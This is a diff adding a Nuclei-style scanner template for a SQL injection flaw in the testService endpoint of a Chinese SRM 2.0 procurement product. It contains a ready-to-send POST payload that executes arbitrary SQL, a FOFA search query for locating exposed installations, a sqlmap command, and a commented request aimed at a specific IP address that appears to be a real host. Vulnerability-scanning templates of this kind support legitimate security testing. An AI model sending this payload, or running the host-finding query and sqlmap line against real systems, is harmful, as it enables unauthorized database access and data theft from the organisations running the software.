@@ -1,0 +1,57 @@
+id: zhilink-srm-testService-sqli
+info:
+  name: 智联云仓 SRM 2.0 testService - sqli
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://github.com/wy876/POC/blob/main/%E6%99%BA%E4%BA%92%E8%81%94%E7%A7%91%E6%8A%80%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8/%E6%99%BA%E8%81%94%E4%BA%91%E9%87%87testService%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    fofa-query: title=="SRM 2.0"
+    sqlmap: sqlmap -r sqli --random-agent
+  tags: srm,sqli,zhilink
+
+http:
+  - raw:
+      - |
+        POST /adpweb/a/ica/api/testService HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+        X-Requested-With: XMLHttpRequest
+        Content-Type: application/json
+
+        {
+            "dbId": "1001",
+            "dbSql": "#set ($lang = $lang) SELECT * FROM v$version",
+            "responeTemplate": "{\"std_data\": {\"execution\": {\"sqlcode\": \"$execution.sqlcode\", \"description\": \"$execution.description\"}}}",
+            "serviceCode": "q",
+            "serviceName": "q",
+            "serviceParams": "{\"lang\":\"zh_CN\"}"
+        }
+
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains(body,'执行成功')
+        condition: and
+
+# POST /adpweb/a/ica/api/testService HTTP/1.1
+# Host: 116.6.193.67:8083
+# User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+# Connection: close
+# Content-Length: 325
+# Content-Type: application/json
+# X-Requested-With: XMLHttpRequest
+# Accept-Encoding: gzip
+
+# {
+#     "dbId": "1001",
+#     "dbSql": "#set ($lang = $lang) SELECT * FROM v$version",
+#     "responeTemplate": "{\"std_data\": {\"execution\": {\"sqlcode\": \"$execution.sqlcode\", \"description\": \"$execution.description\"}}}",
+#     "serviceCode": "q",
+#     "serviceName": "q",
+#     "serviceParams": "{\"lang\":\"zh_CN\"}"
+# }
